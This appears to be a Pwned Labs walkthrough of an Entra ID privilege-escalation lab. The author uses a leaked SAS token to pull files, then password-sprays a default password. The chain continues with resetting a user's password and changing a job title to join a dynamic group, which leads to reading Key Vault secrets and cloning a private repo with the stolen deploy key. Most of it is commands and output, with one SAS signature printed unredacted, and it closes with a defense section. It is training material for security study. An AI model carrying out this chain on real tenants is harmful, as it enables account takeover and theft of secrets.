---
title: Abuse Dynamic Groups in Entra ID for Privilege Escalation
description: Abuse Dynamic Groups in Entra ID for Privilege Escalation
image:
  path: azure.webp
categories:
- Pwned Labs
- Azure
layout: post
media_subpath: /assets/posts/labs/pwnedlabs/azure/
tags:
- pwnedlabs
- azure
- cloud
---
# Scenario
Mega Big Tech want security to be their number one business priority, but acknowledge that they still have a way to go. Your red team is tasked with the objective of accessing the secret internal algorithm for their social app, and to help them improve their security along the way! We have identified a public GitHub repository that belongs to the company, can you use this to your advantage?

Mega Big Tech will begin rolling out their own External Authentication Provider to reduce yearly operating costs. However, threat actors have already compromised the custom provider and altered its configuration. As a result, any Multifactor Authentication (MFA) challenge will now automatically return as successful, ultimately satisfying any Conditional Access Policy (CAP) that requires the standalone-MFA grant control (as opposed to the Authentication Strength-MFA grant control).

# Walkthrough
Let's start with examining GitHub repository. It contains static index.html and an ASPX page for uploading resumes.

![](abuse-dynamic-groups-in-entra-id-for-privilege-escalation-1.png)

We see commits by Jess Armstrong

![](abuse-dynamic-groups-in-entra-id-for-privilege-escalation-2.png)

Let's start with `Add local files` commit. We see the file `UploadResume.aspx.cs` that contains SAS token. The token provides access to resources in an Azure storage account

![](abuse-dynamic-groups-in-entra-id-for-privilege-escalation-3.png)

Azure storage account resources can be accessed using a SAS URI. A SAS Uniform Resource Identifier (URI) is a unique sequence of characters that identifies a resource. Azure SAS URIs consist of a Storage Resource URI and a SAS token. 

![](abuse-dynamic-groups-in-entra-id-for-privilege-escalation-4.png)

`blobServiceEndpoint` and `containerName` together make up the Storage Resource URI. In the blob service endpoint https://mbtfileshr.blob.core.windows.net/, the storage account name is `mbtfileshr`
```
string blobServiceEndpoint = "https://mbtfileshr.blob.core.windows.net/";
string sasToken = "?sv=2022-11-02&ss=bfqt&srt=sco&sp=rl&se=2099-05-06T06:03:29Z&st=2024-05-05T22:03:29Z&spr=https&sig=<REDACTED>";
string containerName = "resumes";
```

Let's examine each component of the SAS token
```
?sv=2022-11-02&ss=bfqt&srt=sco&sp=rl&se=2099-05-06T06:03:29Z&st=2024-05-05T22:03:29Z&spr=https&sig=Dws3bgGUWCUknRdVmRoFXItmnItJDLHy76Axgu1qNtE="
```
- `sv` (Service Version): Specifies the version of the Storage service API to use. This is set to "2022-11-02".
- `ss` (Services): Indicates which services the SAS token applies to. Here, it includes:
  - `b` for Blob storage,
  - `f` for File storage,
  - `q` for Queue storage,
  - `t` for Table storage.
- `srt` (Resource Types): Specifies the types of resources that are accessible with the SAS token. This includes:
  - `s` for Service (e.g., Get service properties),
  - `c` for Container (e.g., List blobs in container),
  - `o` for Object (e.g., Read blob content).
- `sp` (Permissions): Details the permitted actions. In this case:
  - `r` for Read access,
  - `l` for List capabilities.
- `se` (End Time): Defines the expiration time of the SAS token. Here, it is set to "2099-05-06T06:03:29Z", indicating the token is valid until May 6, 2099.
- `st` (Start Time): Specifies the start time from when the token becomes valid. For this token, it's "2024-05-05T22:03:29Z".
- `spr` (Protocol): Restricts the protocols through which the resources can be accessed. It’s set to HTTPS, ensuring all communications are secure.
- `sig` (Signature): The cryptographic signature, which is an encoded string generated from the account key and the string-to-sign. It is used to authenticate the SAS token request.


We can authenticate using the SAS token with the Azure CLI. Let's list the containers in the `mbtfileshr` storage account.
```
└─PS> az storage container list --account-name mbtfileshr --sas-token "sv=2022-11-02&ss=bfqt&srt=sco&sp=rl&se=2099-05-06T06:03:29Z&st=2024-05-05T22:03:29Z&spr=https&sig=<REDACTED>" --output table

Name               Lease Status    Last Modified
-----------------  --------------  -------------------------
candidate-resumes                  2024-05-05T20:05:34+00:00
```
When running commands on Windows, we have to use the single and double quote around the SAS token
```
az storage container list --account-name mbtfileshr --sas-token '"sv=2022-11-02&ss=bfqt&srt=sco&sp=rl&se=2099-05-06T06:03:29Z&st=2024-05-05T22:03:29Z&spr=https&sig=<REDACTED>"' --output table
```

Let's check the folder `candidate-resumes` which is different from what we saw in the commit. Let's list the blobs in this container.
```
└─PS> az storage blob list --account-name mbtfileshr --container-name candidate-resumes --sas-token "sv=2022-11-02&ss=bfqt&srt=sco&sp=rl&se=2099-05-06T06:03:29Z&st=2024-05-05T22:03:29Z&spr=https&sig=<REDACTED>" --output table
Name                                       Blob Type    Blob Tier    Length    Content Type     Last Modified              Snapshot
-----------------------------------------  -----------  -----------  --------  ---------------  -------------------------  ----------
Angelina Lee Resume.pdf                    BlockBlob    Hot          113254    application/pdf  2024-08-23T13:46:32+00:00
Mega Big Tech New Employee Onboarding.pdf  BlockBlob    Hot          42700     application/pdf  2024-05-07T22:08:06+00:00

```

Let's download PDF files
```
└─PS> az storage blob download --account-name mbtfileshr --container-name candidate-resumes --name "Angelina Lee Resume.pdf" --file "Angelina Lee Resume.pdf" --sas-token 'sv=2022-11-02&ss=bfqt&srt=sco&sp=rl&se=2099-05-06T06:03:29Z&st=2024-05-05T22:03:29Z&spr=https&sig=<REDACTED>' --output table
Finished[#############################################################]  100.0000%
Name                     Blob Type    Blob Tier    Length    Content Type     Last Modified              Snapshot
-----------------------  -----------  -----------  --------  ---------------  -------------------------  ----------
Angelina Lee Resume.pdf  BlockBlob                 113254    application/pdf  2024-08-23T13:46:32+00:00
```
```
└─PS> az storage blob download --account-name mbtfileshr --container-name candidate-resumes --name "Mega Big Tech New Employee Onboarding.pdf" --file "Mega Big Tech New Employee Onboarding.pdf" --sas-token 'sv=2022-11-02&ss=bfqt&srt=sco&sp=rl&se=2099-05-06T06:03:29Z&st=2024-05-05T22:03:29Z&spr=https&sig=<REDACTED>' --output table
Finished[#############################################################]  100.0000%
Name                                       Blob Type    Blob Tier    Length    Content Type     Last Modified              Snapshot
-----------------------------------------  -----------  -----------  --------  ---------------  -------------------------  ----------
Mega Big Tech New Employee Onboarding.pdf  BlockBlob                 42700     application/pdf  2024-05-07T22:08:06+00:00
```

`Mega Big Tech New Employee Onboarding.pdf`  contains default password for all Mega Big Tech new employees. The company recommends users to change this password but don't enforce it.

![](abuse-dynamic-groups-in-entra-id-for-privilege-escalation-5.png)

If Angelina Lee has been hired maybe she still has the default password set? 

First, we need to find the User Principal Name (UPN) for the user. We can use the [username-anarchy](https://github.com/urbanadventurer/username-anarchy) to generate possible UPNs. Specify the `@megabigtech.com` domain using the `--suffix` paramter, with the Full Name specified after as a positional argument. Run the command to generate UPN permutations:
```
└─$ username-anarchy --suffix @megabigtech.com Angelina Lee > emails.txt
```
```
└─$ cat emails.txt 
angelina@megabigtech.com
angelinalee@megabigtech.com
angelina.lee@megabigtech.com
angelee@megabigtech.com
angelinal@megabigtech.com
a.lee@megabigtech.com
alee@megabigtech.com
langelina@megabigtech.com
l.angelina@megabigtech.com
leea@megabigtech.com
lee@megabigtech.com
lee.a@megabigtech.com
lee.angelina@megabigtech.com
al@megabigtech.com

```

Now, we can use [Oh365UserFinder](https://github.com/dievus/Oh365UserFinder) to finf if user exists
```
└─$ python3 oh365userfinder.py -r emails.txt

   ____  __   _____ _____ ______   __  __                  _______           __          
  / __ \/ /_ |__  // ___// ____/  / / / /_______  _____   / ____(_)___  ____/ /__  _____
 / / / / __ \ /_ </ __ \/___ \   / / / / ___/ _ \/ ___/  / /_  / / __ \/ __  / _ \/ ___/ 
/ /_/ / / / /__/ / /_/ /___/ /  / /_/ (__  )  __/ /     / __/ / / / / / /_/ /  __/ /     
\____/_/ /_/____/\____/_____/   \____/____/\___/_/     /_/   /_/_/ /_/\__,_/\___/_/     

                                   Version 1.1.2                                         
                               A project by The Mayor                                    
                        Oh365UserFinder.py -h to get started                            

------------------------------------------------------------------------------------------

[info] Starting Oh365 User Finder at Mon Sep 15 21:34:33 2025

[!] angelina@megabigtech.com                             Result -  Desktop SSO Enabled [!] 
[!] angelinalee@megabigtech.com                          Result -  Desktop SSO Enabled [!] 
[!] angelina.lee@megabigtech.com                         Result -  Desktop SSO Enabled [!] 
[!] angelee@megabigtech.com                              Result -  Desktop SSO Enabled [!] 
[!] angelinal@megabigtech.com                            Result -  Desktop SSO Enabled [!] 
[!] a.lee@megabigtech.com                                Result -  Desktop SSO Enabled [!] 
[!] alee@megabigtech.com                                 Result -  Desktop SSO Enabled [!] 
[+] alee@megabigtech.com                                 Result -   Valid Email Found! [+]
[!] langelina@megabigtech.com                            Result -  Desktop SSO Enabled [!] 
[!] l.angelina@megabigtech.com                           Result -  Desktop SSO Enabled [!] 
[!] leea@megabigtech.com                                 Result -  Desktop SSO Enabled [!] 
[!] lee@megabigtech.com                                  Result -  Desktop SSO Enabled [!] 
[!] lee.a@megabigtech.com                                Result -  Desktop SSO Enabled [!] 
[!] lee.angelina@megabigtech.com                         Result -  Desktop SSO Enabled [!] 
[!] al@megabigtech.com                                   Result -  Desktop SSO Enabled [!] 

[info] Oh365 User Finder discovered one valid login account.                                                                                                                                                                                

[info] Scan completed at Mon Sep 15 21:34:49 2025 
```

We found a valid email. Now we can run the same tool using the parameter `--pwspray` to check if the default password is set. It seems that Angelina didn't change her password since being hired
```
└─$ python3 oh365userfinder.py --el emails.txt --password '<REDACTED>' --pwspray

   ____  __   _____ _____ ______   __  __                  _______           __
  / __ \/ /_ |__  // ___// ____/  / / / /_______  _____   / ____(_)___  ____/ /__  _____
 / / / / __ \ /_ </ __ \/___ \   / / / / ___/ _ \/ ___/  / /_  / / __ \/ __  / _ \/ ___/
/ /_/ / / / /__/ / /_/ /___/ /  / /_/ (__  )  __/ /     / __/ / / / / / /_/ /  __/ /
\____/_/ /_/____/\____/_____/   \____/____/\___/_/     /_/   /_/_/ /_/\__,_/\___/_/

                                   Version 1.1.2
                               A project by The Mayor
                        Oh365UserFinder.py -h to get started

------------------------------------------------------------------------------------------

[info] Starting Oh365 User Finder at Mon Sep 15 21:36:19 2025

[+] alee@megabigtech.com                         Result -                VALID PASSWORD! [+]

[info] Oh365 User Finder discovered one valid credential pair.

[info] Scan completed at Mon Sep 15 21:36:21 2025  
```
First we need to find the tenant, we can use https://aadinternals.com/osint/ or run `Invoke-AADIntReconAsOutsider`
```
└─PS> Invoke-AADIntReconAsOutsider -UserName "alee@megabigtech.com" | Format-Table
Tenant brand:       Default Directory                                                                                   
Tenant name:                                                                                                            
Tenant id:          2590ccef-687d-493b-ae8d-441cbab63a72                                                                
Tenant region:      EU                                                                                                  
DesktopSSO enabled: True                                                                                                
Get-TenantSubscope: /home/kali/.local/share/powershell/Modules/AADInternals/0.9.8/KillChain_utils.ps1:266               
Line |                                                                                                                  
 266 |  …            $SubScope = Get-TenantSubscope -Domain $User.Split("@")[1]                                         
     |                                                      ~~~~~~~~~~~~~~~~~~~                                         
     | Cannot bind argument to parameter 'Domain' because it is an empty string.                                        
WARNING: Requests throttled!                                                                                            
CBA enabled:        True                                                                                                
                                                                                                                        
Name              DNS    MX   SPF DMARC  DKIM MTA-STS Type    STS                                                       
----              ---    --   --- -----  ---- ------- ----    ---                                                       
megabigtech.com False False False       False   False Managed 
```

![](abuse-dynamic-groups-in-entra-id-for-privilege-escalation-6.png)

Let's connect as Angelina
```
└─PS> Connect-AzAccount -TenantId 2590ccef-687d-493b-ae8d-441cbab63a72
Please select the account you want to login with.

Retrieving subscriptions for the selection...

Subscription name Tenant
----------------- ------
                  2590ccef-687d-493b-ae8d-441cbab63a72
```

We don't have access to Azure resources
```
└─PS> Get-AzResource
Get-AzResource: 'this.Client.SubscriptionId' cannot be null.
```

Let's enumerate Entra ID
```
> Install-Module Microsoft.Graph
> Import-Module Microsoft.Graph
> Connect-MgGraph
```

Now let's enumerate our user, which happens to be an Engineering Manager.
```
└─PS> Get-MgUser -UserId alee@megabigtech.com | fl                                                                                                                                                                                          

AboutMe                               : 
AccountEnabled                        : 
Activities                            : 
AgeGroup                              : 
AgreementAcceptances                  : 
AppRoleAssignments                    : 
AssignedLicenses                      : 
AssignedPlans                         : 
Authentication                        : Microsoft.Graph.PowerShell.Models.MicrosoftGraphAuthentication
AuthorizationInfo                     : Microsoft.Graph.PowerShell.Models.MicrosoftGraphAuthorizationInfo
Birthday                              : 
BusinessPhones                        : {}
Calendar                              : Microsoft.Graph.PowerShell.Models.MicrosoftGraphCalendar
CalendarGroups                        : 
CalendarView                          : 
Calendars                             : 
Chats                                 : 
City                                  : 
CloudClipboard                        : Microsoft.Graph.PowerShell.Models.MicrosoftGraphCloudClipboardRoot
CompanyName                           : 
ConsentProvidedForMinor               : 
ContactFolders                        : 
Contacts                              : 
Country                               : 
CreatedDateTime                       : 
CreatedObjects                        : 
CreationType                          : 
CustomSecurityAttributes              : Microsoft.Graph.PowerShell.Models.MicrosoftGraphCustomSecurityAttributeValue
DataSecurityAndGovernance             : Microsoft.Graph.PowerShell.Models.MicrosoftGraphUserDataSecurityAndGovernance
DeletedDateTime                       : 
Department                            : 
DeviceEnrollmentLimit                 : 
DeviceManagementTroubleshootingEvents : 
DirectReports                         : 
DisplayName                           : Angelina Lee
Drive                                 : Microsoft.Graph.PowerShell.Models.MicrosoftGraphDrive
Drives                                : 
EmployeeExperience                    : Microsoft.Graph.PowerShell.Models.MicrosoftGraphEmployeeExperienceUser
EmployeeHireDate                      : 
EmployeeId                            : 
EmployeeLeaveDateTime                 : 
EmployeeOrgData                       : Microsoft.Graph.PowerShell.Models.MicrosoftGraphEmployeeOrgData
EmployeeType                          : 
Events                                : 
Extensions                            : 
ExternalUserState                     : 
ExternalUserStateChangeDateTime       : 
FaxNumber                             : 
FollowedSites                         : 
GivenName                             : 
HireDate                              : 
Id                                    : a2e5eb93-7d64-40d8-9e23-715a9cca5112
Identities                            : 
ImAddresses                           : 
InferenceClassification               : Microsoft.Graph.PowerShell.Models.MicrosoftGraphInferenceClassification
Insights                              : Microsoft.Graph.PowerShell.Models.MicrosoftGraphItemInsights
Interests                             : 
IsManagementRestricted                : 
IsResourceAccount                     : 
JobTitle                              : Manager
JoinedTeams                           : 
LastPasswordChangeDateTime            : 
LegalAgeGroupClassification           : 
LicenseAssignmentStates               : 
LicenseDetails                        : 
Mail                                  : 
MailFolders                           : 
MailNickname                          : 
MailboxSettings                       : Microsoft.Graph.PowerShell.Models.MicrosoftGraphMailboxSettings
ManagedAppRegistrations               : 
ManagedDevices                        : 
Manager                               : Microsoft.Graph.PowerShell.Models.MicrosoftGraphDirectoryObject
MemberOf                              : 
Messages                              : 
MobilePhone                           : 
MySite                                : 
Oauth2PermissionGrants                : 
OfficeLocation                        : 
OnPremisesDistinguishedName           : 
OnPremisesDomainName                  : 
OnPremisesExtensionAttributes         : Microsoft.Graph.PowerShell.Models.MicrosoftGraphOnPremisesExtensionAttributes
OnPremisesImmutableId                 : 
OnPremisesLastSyncDateTime            : 
OnPremisesProvisioningErrors          : 
OnPremisesSamAccountName              : 
OnPremisesSecurityIdentifier          : 
OnPremisesSyncEnabled                 : 
OnPremisesUserPrincipalName           : 
Onenote                               : Microsoft.Graph.PowerShell.Models.MicrosoftGraphOnenote
OnlineMeetings                        : 
OtherMails                            : 
Outlook                               : Microsoft.Graph.PowerShell.Models.MicrosoftGraphOutlookUser
OwnedDevices                          : 
OwnedObjects                          : 
PasswordPolicies                      : 
PasswordProfile                       : Microsoft.Graph.PowerShell.Models.MicrosoftGraphPasswordProfile
PastProjects                          : 
People                                : 
PermissionGrants                      : 
Photo                                 : Microsoft.Graph.PowerShell.Models.MicrosoftGraphProfilePhoto
Photos                                : 
Planner                               : Microsoft.Graph.PowerShell.Models.MicrosoftGraphPlannerUser
PostalCode                            : 
PreferredDataLocation                 : 
PreferredLanguage                     : 
PreferredName                         : 
Presence                              : Microsoft.Graph.PowerShell.Models.MicrosoftGraphPresence
Print                                 : Microsoft.Graph.PowerShell.Models.MicrosoftGraphUserPrint
ProvisionedPlans                      : 
ProxyAddresses                        : 
RegisteredDevices                     : 
Responsibilities                      : 
Schools                               : 
ScopedRoleMemberOf                    : 
SecurityIdentifier                    : 
ServiceProvisioningErrors             : 
Settings                              : Microsoft.Graph.PowerShell.Models.MicrosoftGraphUserSettings
ShowInAddressList                     : 
SignInActivity                        : Microsoft.Graph.PowerShell.Models.MicrosoftGraphSignInActivity
SignInSessionsValidFromDateTime       : 
Skills                                : 
Solutions                             : Microsoft.Graph.PowerShell.Models.MicrosoftGraphUserSolutionRoot
Sponsors                              : 
State                                 : 
StreetAddress                         : 
Surname                               : 
Teamwork                              : Microsoft.Graph.PowerShell.Models.MicrosoftGraphUserTeamwork
Todo                                  : Microsoft.Graph.PowerShell.Models.MicrosoftGraphTodo
TransitiveMemberOf                    : 
UsageLocation                         : 
UserPrincipalName                     : alee@megabigtech.com
UserType                              : 
AdditionalProperties                  : {[@odata.context, https://graph.microsoft.com/v1.0/$metadata#users/$entity]}

```

Let's check administrative units that give users scoped permissions over other Entra ID resources (and implicitely other Azure resources)
```
└─PS> Get-MgDirectoryAdministrativeUnit | fl

DeletedDateTime               : 
Description                   : Scope to manage the authentication settings for the users belonging to the project.
DisplayName                   : Megabigtech-UNIT1
Extensions                    : 
Id                            : 47e4803e-a5ef-4ebc-b967-691815870abd
IsMemberManagementRestricted  : False
Members                       : 
MembershipRule                : 
MembershipRuleProcessingState : 
MembershipType                : 
ScopedRoleMembers             : 
Visibility                    : 
AdditionalProperties          : {}

DeletedDateTime               : 
Description                   : Initial administrative unit for new engineering hires
DisplayName                   : ONBOARDING-ENGINEERING
Extensions                    : 
Id                            : 4a3288aa-1a8b-485a-8ced-2bd80feef625
IsMemberManagementRestricted  : False
Members                       : 
MembershipRule                : 
MembershipRuleProcessingState : 
MembershipType                : 
ScopedRoleMembers             : 
Visibility                    : 
AdditionalProperties          : {}

DeletedDateTime               : 
Description                   : Administrative unit for Mega Big Tech integration projects
DisplayName                   : CONTRACTORS
Extensions                    : 
Id                            : 57d14139-35e8-4cfb-a2a6-2b7dcd232436
IsMemberManagementRestricted  : False
Members                       : 
MembershipRule                : 
MembershipRuleProcessingState : 
MembershipType                : 
ScopedRoleMembers             : 
Visibility                    : 
AdditionalProperties          : {}

DeletedDateTime               : 
Description                   : Teams bot password reset automation
DisplayName                   : User Management
Extensions                    : 
Id                            : beae0ee3-3284-4a4f-94c9-e3a20ef0f388
IsMemberManagementRestricted  : False
Members                       : 
MembershipRule                : 
MembershipRuleProcessingState : 
MembershipType                : 
ScopedRoleMembers             : 
Visibility                    : 
AdditionalProperties          : {}

DeletedDateTime               : 
Description                   : Allows the HR team to manage user properties
DisplayName                   : HR-UNIT2
Extensions                    : 
Id                            : f123c66b-8c78-4bd1-947f-8d43b3a21d04
IsMemberManagementRestricted  : False
Members                       : 
MembershipRule                : 
MembershipRuleProcessingState : 
MembershipType                : 
ScopedRoleMembers             : 
Visibility                    : 
AdditionalProperties          : {}

```

Since current user is an engineering manager, we might have some permissions in the `ONBOARDING-ENGINEERING` administrative unit. We can find out using the `Get-MgDirectoryAdministrativeUnitScopedRoleMember` cmdlet.
```
└─PS> $ScopedRoleMembers = Get-MgDirectoryAdministrativeUnitScopedRoleMember -AdministrativeUnitId 4a3288aa-1a8b-485a-8ced-2bd80feef625
```
```
└─PS> $ScopedRoleMembers

Id                                                                AdministrativeUnitId                 RoleId
--                                                                --------------------                 ------
Wz_yRLtppEGkF8VCd3LeQaqIMkqLGlpIjO0r2A_u9iWT6-WiZH3YQJ4jcVqcylESU 4a3288aa-1a8b-485a-8ced-2bd80feef625 44f23f5b-69bb-41a4-a417-c5427772de41
```

This returns the ID of a role that has been configured in the administrative unit. Running `Get-MgDirectoryRole` with the role ID we see that the privileged `User Administrator` permissions have been granted.
```
└─PS> Get-MgDirectoryRole -DirectoryRoleId 44f23f5b-69bb-41a4-a417-c5427772de41 | fl

DeletedDateTime      : 
Description          : Can manage all aspects of users and groups, including resetting passwords for limited admins.
DisplayName          : User Administrator
Id                   : 44f23f5b-69bb-41a4-a417-c5427772de41
Members              : 
RoleTemplateId       : fe930be7-5e62-47db-91af-98c3a49a38b1
ScopedMembers        : 
AdditionalProperties : {[@odata.context, https://graph.microsoft.com/v1.0/$metadata#directoryRoles/$entity]}
```
This role allows role members to manage all aspects of users and groups, including resetting passwords for limited admins. If this role membership is scoped to an administrative unit then permissions apply only to administrative unit members, not all Entra ID users.

Let's check members of this role in the administrative unit, which happens to be our user
```
foreach ($member in $ScopedRoleMembers) {
    $userId = $member.RoleMemberInfo.Id
    
    if (-not $userId) {
        Write-Output "No user ID available for member with Role ID: $($member.RoleId)"
        continue
    }

    $userDetails = Get-MgUser -UserId $userId
    
    if ($userDetails) {
        Write-Output "User Details: Name - $($userDetails.DisplayName), Email - $($userDetails.Mail), Role ID - $($member.RoleId)"
    } else {
        Write-Output "Failed to retrieve details for user ID: $userId"
    }
}
```
```
└─PS> foreach ($member in $ScopedRoleMembers) {
<SNIP>
User Details: Name - Angelina Lee, Email - , Role ID - 44f23f5b-69bb-41a4-a417-c5427772de41
```

Let's see if there is anyone that we have `User Administrator` permissions to by checking the members of the administrative unit.
```
└─PS> Get-MgDirectoryAdministrativeUnitMember -AdministrativeUnitId 4a3288aa-1a8b-485a-8ced-2bd80feef625                                                                                                                                    

Id                                   DeletedDateTime
--                                   ---------------
f5597fb4-82b3-4b25-9dfb-761a25f36f67 
```
```
└─PS> Get-MgUser -UserId f5597fb4-82b3-4b25-9dfb-761a25f36f67

DisplayName     Id                                   Mail UserPrincipalName
-----------     --                                   ---- -----------------
Felix Schneider f5597fb4-82b3-4b25-9dfb-761a25f36f67      Felix.Schneider@megabigtech.com
```

If we run `Get-MgUser -UserId f5597fb4-82b3-4b25-9dfb-761a25f36f67 | fl`, it also returns the job title `Engineer`.

Let's reset Felix's password
```
$params = @{
    passwordProfile = @{
        forceChangePasswordNextSignIn = $false
        password = "NewSecurePassword123!"
    }
}
```
```
└─PS> Update-MgUser -UserId Felix.Schneider@megabigtech.com -BodyParameter $params
```

Now let's authenticate
```
└─PS> Connect-AzAccount -AccountId "Felix.Schneider@megabigtech.com"
Please select the account you want to login with.

Retrieving subscriptions for the selection...

Subscription name           Tenant
-----------------           ------
Microsoft Azure Sponsorship Default Directory
```

Now if we check resources, we have access to a key vault named `Engineering-Vault1`
```
└─PS> Get-AzResource

Name              : Engineering-Vault1
ResourceGroupName : mbt-rg-13
ResourceType      : Microsoft.KeyVault/vaults
Location          : eastus
ResourceId        : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-13/providers/Microsoft.KeyVault/vaults/Engineering-Vault1
Tags             
```

If we try to get the secrets, we receive an error `Operation returned an invalid status code 'Forbidden'`. It seems that we don't have permissions to view secret values. Interestingly we see the secret name `algo-github-deploy-key` 
```
└─PS> $secrets = Get-AzKeyVaultSecret -VaultName "Engineering-Vault1"
```
```
foreach ($secret in $secrets) {
    Write-Output "Secret Name: $($secret.Name)"
    $secretValue = Get-AzKeyVaultSecret -VaultName "Engineering-Vault1" -Name $secret.Name
    $secretValueText = $secretValue.SecretValue | ConvertFrom-SecureString -AsPlainText
    Write-Output "Secret Value: $secretValueText"
    Write-Output "Content Type: $($secretValue.ContentType)"
}
```

Let's check if dynamic membership rules configured
```
└─PS> $dynamicGroups = Get-MgGroup -Filter "groupTypes/any(c:c eq 'DynamicMembership')"
```
```
foreach ($group in $dynamicGroups) {
    $groupName = $group.DisplayName
    $membershipQuery = $group.MembershipRule
    Write-Output "Group Name: $groupName, Membership Query: $membershipQuery"
}
```
```
└─PS> foreach ($group in $dynamicGroups) {
<SNIP>
Group Name: SERVER-BACKUPS, Membership Query: (user.userPrincipalName -contains "admin")
Group Name: ALGO-ACCESS, Membership Query: (user.jobTitle -eq "Algorithm Administrator")

```

We see the group `ALGO-ACCESS`. Users with the job title `Algorithm Administrator` are dynamically made members of this group. We can update the job title for Felix Schneider to `Algorithm Administrator`, and see what resources Felix is now able to access. The command should be run from Angelina's context
```
└─PS> Update-MgUser -UserId (Get-MgUser -Filter "userPrincipalName eq 'Felix.Schneider@megabigtech.com'").Id -jobTitle "Algorithm Administrator"                                                                                            


```

Now reconnect as Felix and confirm that he's a member of `ALGO-ACCESS` 
```
└─PS> Get-MgGroupMember -GroupId (Get-MgGroup -Filter "displayName eq 'ALGO-ACCESS'").Id | fl

DeletedDateTime      : 
Id                   : f5597fb4-82b3-4b25-9dfb-761a25f36f67
AdditionalProperties : {[@odata.type, #microsoft.graph.user], [businessPhones, System.Object[]], [displayName, Felix Schneider], [givenName, Felix]…}

DeletedDateTime      : 
Id                   : 97d65cdf-a518-48d5-838a-9af92a041115
AdditionalProperties : {[@odata.type, #microsoft.graph.user], [businessPhones, System.Object[]], [displayName, Guy Tremblay], [jobTitle, Algorithm Administrator]…}
```

If run try retrieving secrets, it's successful. Note that, [it could take some time due to delay according to documentation](https://learn.microsoft.com/en-us/troubleshoot/entra/entra-id/dir-dmns-obj/troubleshoot-dynamic-groups#dynamic-membership-update-issues)
```
└─PS> $secrets = Get-AzKeyVaultSecret -VaultName "Engineering-Vault1"
```
```
foreach ($secret in $secrets) {
    Write-Output "Secret Name: $($secret.Name)"
    $secretValue = Get-AzKeyVaultSecret -VaultName "Engineering-Vault1" -Name $secret.Name
    $secretValueText = $secretValue.SecretValue | ConvertFrom-SecureString -AsPlainText
    Write-Output "Secret Value: $secretValueText"
    Write-Output "Content Type: $($secretValue.ContentType)"
}
```
```
└─PS> foreach ($secret in $secrets)
<SNIP>
Secret Name: algo-github-deploy-key
Secret Value: -----BEGIN OPENSSH PRIVATE KEY-----
<REDACTED>
-----END OPENSSH PRIVATE KEY-----

Content Type: Mega-Big-Tech/algorithm-internal/

```
From the GitHub [documentation](https://docs.github.com/v3/guides/managing-deploy-keys), a deploy key is an SSH key that grants access to a single repository. They allow reading (pulling, cloning) from remote repositories and can also allow writing. In the `Content-Type` field we see path similar to git repository: `Mega-Big-Tech/algorithm-internal/`

If we didn't have this additional context in real-life, it is a good idea to test connecting to GitHub (or other code repository platform that is in use) with the private SSH keys that we may find on an engagement. The SSH key may belong to a user or it may be a deploy key. If we run the command below and GitHub responds by saying `Hi <depository-name>!`, this confirms that it's a deploy key.
```
ssh -i ./deploy-key.pem git@github.com
```

Save the key locally and clone the repository. Set the `GIT_SSH_COMMAND` environment variable for the duration of the command. The value of this environment variable specifies the SSH command to use when git needs to connect to a remote system.
```
└─$ GIT_SSH_COMMAND='ssh -i deploy-key.pem -o IdentitiesOnly=yes' git clone git@github.com:/Mega-Big-Tech/algorithm-internal
```
```
└─$ ls -lha
total 120K
drwxrwxr-x 28 kali kali 4.0K Sep 15 22:56 .
drwxrwxr-x  5 kali kali 4.0K Sep 15 22:56 ..
drwxrwxr-x  3 kali kali 4.0K Sep 15 22:56 ann
drwxrwxr-x  2 kali kali 4.0K Sep 15 22:56 ci
drwxrwxr-x  4 kali kali 4.0K Sep 15 22:56 cr-mixer
drwxrwxr-x  2 kali kali 4.0K Sep 15 22:56 docs
-rw-rw-r--  1 kali kali   33 Sep 15 22:56 flag.txt
drwxrwxr-x  5 kali kali 4.0K Sep 15 22:56 follow-recommendations-service
drwxrwxr-x  8 kali kali 4.0K Sep 15 22:56 .git
drwxrwxr-x  4 kali kali 4.0K Sep 15 22:56 graph-feature-service
drwxrwxr-x  3 kali kali 4.0K Sep 15 22:56 home-mixer
drwxrwxr-x  6 kali kali 4.0K Sep 15 22:56 navi
drwxrwxr-x  5 kali kali 4.0K Sep 15 22:56 product-mixer
drwxrwxr-x  3 kali kali 4.0K Sep 15 22:56 pushservice
-rw-rw-r--  1 kali kali   20 Sep 15 22:56 README.md
drwxrwxr-x  3 kali kali 4.0K Sep 15 22:56 recos-injector
drwxrwxr-x  5 kali kali 4.0K Sep 15 22:56 representation-manager
drwxrwxr-x  5 kali kali 4.0K Sep 15 22:56 representation-scorer
drwxrwxr-x  3 kali kali 4.0K Sep 15 22:56 science
drwxrwxr-x  4 kali kali 4.0K Sep 15 22:56 simclusters-ann
drwxrwxr-x  6 kali kali 4.0K Sep 15 22:56 src
drwxrwxr-x  5 kali kali 4.0K Sep 15 22:56 timelineranker
drwxrwxr-x  3 kali kali 4.0K Sep 15 22:56 timelines
drwxrwxr-x  3 kali kali 4.0K Sep 15 22:56 topic-social-proof
drwxrwxr-x  5 kali kali 4.0K Sep 15 22:56 trust_and_safety_models
drwxrwxr-x  5 kali kali 4.0K Sep 15 22:56 tweetypie
drwxrwxr-x  5 kali kali 4.0K Sep 15 22:56 twml
drwxrwxr-x 10 kali kali 4.0K Sep 15 22:56 unified_user_actions
drwxrwxr-x  4 kali kali 4.0K Sep 15 22:56 user-signal-service
drwxrwxr-x  3 kali kali 4.0K Sep 15 22:56 visibilitylib

```
# Attack Path
Attack path visualization created by [Mathias Persson](https://www.linkedin.com/in/mathias-persson-582b60197/) for Pwned Labs

![](abuse-dynamic-groups-in-entra-id-for-privilege-escalation-7.png)



# Defense

This section is from [Walkthrough section](https://pwnedlabs.io/labs/abuse-dynamic-groups-in-entra-id-for-privilege-escalation) of the lab.

- Azure storage account SAS token was exposed in the GitHub repo, which allowed us to access the candidate-resumes blob container. 
  - The SAS token allowed us to list the contents of the container, which revealed the candidate resume. 
  - If a SAS token is going to be used to upload submitted candidate resumes to blob storage, the token should not have list permissions on the container.
  - It's worth noting that with a SAS token there is no direct way to identify which clients have accessed a resource. 
  - However, we can use the unique fields in the SAS, the signed IP (`sip`), signed start (`st`), and signed expiry (`se`) fields, to track access.
- A new employee onboarding document was found to be stored there that also exposed the default password for new joiners. 
  - This document shouldn't have been stored there, as it has a different classification and data type to the candidate resumes.
  - The candidate resumes names should be randomized to prevent discovery by requesting potential files directly. 
  - Didn't enforce changing the default password, which allowed to gain a foothold in their Azure environment as Angelina Lee using the CLI
    - This was possible as Mega Big Tech hadn't enabled MFA authentication for this user. 
    - Ideally the company should allow users to log in only from managed devices.
- It was possible to edit user profile values may be able to access any group that has dynamic group membership rules configured, that are based on user profile attributes.

